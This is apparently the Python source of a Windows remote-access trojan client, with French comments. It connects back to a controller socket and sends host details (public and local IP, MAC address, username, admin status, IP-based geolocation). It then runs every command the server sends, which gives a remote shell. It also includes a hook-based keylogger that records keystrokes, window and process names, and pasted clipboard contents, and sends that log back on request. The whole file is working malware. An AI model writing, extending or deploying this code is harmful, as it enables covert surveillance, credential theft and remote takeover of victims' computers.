import socket
import os
import subprocess
from ctypes import *
import pythoncom
import pyHook
import ctypes
import win32clipboard
# import win32gui
from win32com.makegw.makegwparse import *
from _thread import *

ClientSocket = socket.socket()
host = '127.0.0.1'
port = 1233

SEPARATOR = "<sep>"
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

keylogger_mode = "stop"

print('Waiting for connection')
try:
    ClientSocket.connect((host, port))
except socket.error as e:
    print(str(e))

cwd = os.getcwd()
ClientSocket.send(cwd.encode())

def Keylloger():
    
    #create and register a hook manager
    k1 = pyHook.HookManager()
    k1.KeyDown = Keystroke
    #register the hook and execute forever
    k1.HookKeyboard()
    pythoncom.PumpMessages()

    ## Fonction keylloger ##

def get_current_process():
    #Get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()
    print("hwnd",hwnd)
    #Find Process id
    pid = c_ulong()
    print("pid",pid)
    user32.GetWindowThreadProcessId(hwnd ,byref(pid))
    #store the current process ID
    process_id = pid.value
    print("processid",process_id)
    #grab the executable
    executable = create_string_buffer (b'\x00',512)
    h_process = kernel32.OpenProcess(0x400 | 0x10 ,False ,pid)
    psapi.GetModuleBaseNameA(h_process ,None ,byref(executable) ,512)
    #now read its title
    window_title = create_string_buffer(b"\x00",512)
    print(window_title , executable ,process_id ,hwnd)
    length = user32.GetWindowTextA(hwnd ,byref(window_title) ,512)

    # w = win32gui
    # z=w.GetWindowText(w.GetForegroundWindow())
    #print out the header if we're in the right process
    print()
    print("PID : %s - %s - %s"%(process_id,executable.value ,window_title.value))
    var = "PID : %s - %s - %s"%(process_id,executable.value ,window_title.value)
    file = open("keylogs.txt", 'a')
    file.write("\n%s\n"%var)
    file.close()
    print()
    #close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

def Keystroke(event ):
    global current_window
    ##Couper le keylogger
    if keylogger_mode == "stop":
        ctypes.windll.user32.PostQuitMessage(0)
    #check to see if target changed windows
    if event.WindowName != current_window :
        current_window = event.WindowName
        get_current_process()
    #if they pressed a standard key
    if event.Ascii in range(32 ,128) :
        print(chr(event.Ascii))
        h = chr(event.Ascii)
        file = open("keylogs.txt", 'a')
        file.write("%s"%h)
        file.close()
    else :
        #if [CTRL-V] ,get the value on the clipboard
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print("[PASTE] - {0}".format(pasted_value))
            file =open("keylogs.txt" ,'a')
            file.write("\n[PASTE] - {0}\n".format(pasted_value))
            file.close()
        else :
            print("{0}".format(event.Key))
            file = open("keylogs.txt", 'a')
            file.write("{0}".format(event.Key))
            file.close()
    #pass execution to next hook registered
    return True

def platform():
    """
    Return the system platform of host machine
    """
    import sys
    return sys.platform

def public_ip():
    """
    Return public IP address of host machine
    """
    import sys
    if sys.version_info[0] > 2:
        from urllib.request import urlopen
    else:
        from urllib import urlopen
    return urlopen('http://api.ipify.org').read()


def local_ip():
    """
    Return local IP address of host machine
    """
    import socket
    return socket.gethostbyname(socket.gethostname())


def mac_address():
    """
    Return MAC address of host machine
    """
    import uuid
    return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper()


def architecture():
    """
    Check if host machine has 32-bit or 64-bit processor architecture
    """
    import struct
    return int(struct.calcsize('P') * 8)


def device():
    """
    Return the name of the host machine
    """
    import socket
    return socket.getfqdn(socket.gethostname())


def username():
    """
    Return username of current logged in user
    """
    import os
    return os.getenv('USER', os.getenv('USERNAME', 'user'))


def administrator():
    """
    Return True if current user is administrator, otherwise False
    """
    import os
    import ctypes
    return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name == 'nt' else os.getuid() == 0)


def geolocation():
    """
    Return latitute/longitude of host machine (tuple)
    """
    import sys
    import json
    if sys.version_info[0] > 2:
        from urllib.request import urlopen
    else:
        from urllib2 import urlopen
    response = urlopen('http://ipinfo.io').read()
    json_data = json.loads(response)
    latitude, longitude = json_data.get('loc').split(',')
    return (latitude, longitude)


def ipv4(address):
    """
    Check if valid IPv4 address
    `Required`
    :param str address:   string to check
    Returns True if input is valid IPv4 address, otherwise False
    """
    import socket
    try:
        if socket.inet_aton(str(address)):
            return True
    except:
        return False



info = [platform(), public_ip(), local_ip(), mac_address(), architecture(), device(), username(), administrator(), geolocation(), ipv4(local_ip())]


message = f"{info[0]}{SEPARATOR}{info[1]}{SEPARATOR}{info[2]}{SEPARATOR}{info[3]}{SEPARATOR}{info[4]}{SEPARATOR}{info[5]}{SEPARATOR}{info[6]}{SEPARATOR}{info[7]}{SEPARATOR}{info[8]}{SEPARATOR}{info[9]}"
ClientSocket.send(message.encode())

### AJOUTER LE NUMERO DE SESSION DANS LES INFO


##############

## boucle du client ##

while True:
    # receive the command from the server
    command = ClientSocket.recv(BUFFER_SIZE).decode('utf-8')
    splited_command = command.split()
    print(command)
    #output = subprocess.getoutput(command)
    #ClientSocket.send(str.encode(output))
    if splited_command[0].lower() == "keylogger":

        if splited_command[1].lower() == "run" and keylogger_mode != "run":
            ## run le keylogger
            keylogger_mode = "run"
            output = "Keylogger Activé"
            ## lance un thread de keylog
            start_new_thread(Keylloger, ())


        elif splited_command[1].lower() == "status":
            ## envoyer retour du keylogger
            keylogger_mode = "status"
            file = open("keylogs.txt", 'r')
            logs = file.read()
            file.close()
            output = logs

        elif splited_command[1].lower() == "stop":
            ## run le keylogger
            keylogger_mode = "stop"
            output = "Keylogger Desactivé"
    
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    if splited_command[0].lower() == "cd":
        # cd command, change directory
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        else:
            # if operation is successful, empty message
            output = ""
    elif splited_command[0].lower() != "keylogger":
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)
    # get the current working directory as output
    cwd = os.getcwd()
    # send the results back to the server
    message = f"{output}{SEPARATOR}{cwd}"
    ClientSocket.send(message.encode())


    #Input = input('Say Something: ')
    #ClientSocket.send(str.encode(Input))
    #Response = ClientSocket.recv(1024)
    #print(Response.decode('utf-8'))





## Fin de Connection ##

ClientSocket.close()


